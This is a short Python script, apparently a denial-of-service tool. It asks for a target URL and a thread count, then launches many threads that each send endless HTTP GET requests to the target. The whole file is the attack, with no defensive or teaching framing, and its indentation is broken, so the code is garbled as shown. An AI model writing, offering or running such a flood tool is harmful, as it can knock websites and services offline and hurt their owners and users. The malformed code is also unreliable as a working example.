import threading
import requests 

def dos(target):
        try:


    while True:

            res = requests.get(target)

            print("Request sent!")

        except requests.exceptions.ConnectionError:

            print("[!!!] " + "Connection error!")

 

threads = 50



url = input("Enter URL>> ")

 

try:

    threads = int(input("Threads: "))

except ValueError:

    exit("Threads count is incorrect!")

 

if threads == 0:

    exit("Threads count is incorrect!")

 

if not url.__contains__("http"):

    exit("URL doesnt contains http or https!")

 

if not url.__contains__("."):

    exit("Invalid domain!")

 

for i in range(0, threads):

    thr = threading.Thread(target=dos, args=(url,))

    thr.start()

    print(str(i + 1) + " threads started!")
